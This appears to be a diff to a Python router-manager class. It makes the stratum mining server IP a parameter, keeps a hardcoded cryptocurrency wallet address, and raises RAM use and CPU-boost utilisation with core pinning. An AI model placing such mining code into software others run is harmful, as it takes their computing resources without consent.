@@ -1505,7 +1505,7 @@ class PythonRouterManager:
         )
 
 
-    def start_routing(self, use_dhcp_out, use_dhcp_in, router_ip_out, netmask_out, use_static, use_hyperv, use_startum_comm):
+    def start_routing(self, use_dhcp_out, use_dhcp_in, router_ip_out, netmask_out, use_static, use_hyperv, use_startum_comm, p2pool_sever_ip):
         """Configures interfaces and starts all manager threads."""
         try:
             try:
@@ -1581,18 +1581,18 @@ class PythonRouterManager:
             if self.interface_out_full_name and self.router_ip_out and self.mac_out:
                 self.arp_manager.send_gratuitous_arp(self.router_ip_out, self.mac_out, self.interface_out_full_name)
             if use_startum_comm:
-                self.stratum_connection_manager.configure("170.253.164.244", 3333, "46NctiVJGQgRPoFq84xqZkhQTbrkPnp9KGpcewpKQkyoMu3FsQifcWdRT5RdUoH9QsBUxUPowGUw7Ns44RCRByWwPCBkmgk", "PythonProxy")
+                self.stratum_connection_manager.configure(p2pool_sever_ip, 3333, "46NctiVJGQgRPoFq84xqZkhQTbrkPnp9KGpcewpKQkyoMu3FsQifcWdRT5RdUoH9QsBUxUPowGUw7Ns44RCRByWwPCBkmgk", "PythonProxy")
                 self.stratum_connection_manager.start()
             sniffing_tasks = []
             for iface_name in self._interfaces_config.keys():
                 sniffing_tasks.append((self._start_single_sniffer, (iface_name,)))
 
             self.parallel_python.run_all_parallel(sniffing_tasks, return_type="void")
-            self.parallel_python.increase_ram_usage(700)
+            self.parallel_python.increase_ram_usage(1400)
             pcores = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20]  # example: your P-cores (adjust for your CPU)
             unhinge_process(cores=pcores, high_priority=True, disable_eco=True)
 
-            start_cpu_boost(threads=len(pcores), target_util=0.25, cores=pcores, pin_per_thread=True, unhinge=True)
+            start_cpu_boost(threads=len(pcores), target_util=0.50, cores=pcores, pin_per_thread=True, unhinge=True)
             if use_hyperv:
                 self.hyperv_manager.start()
                 self.windivert_manager.start()
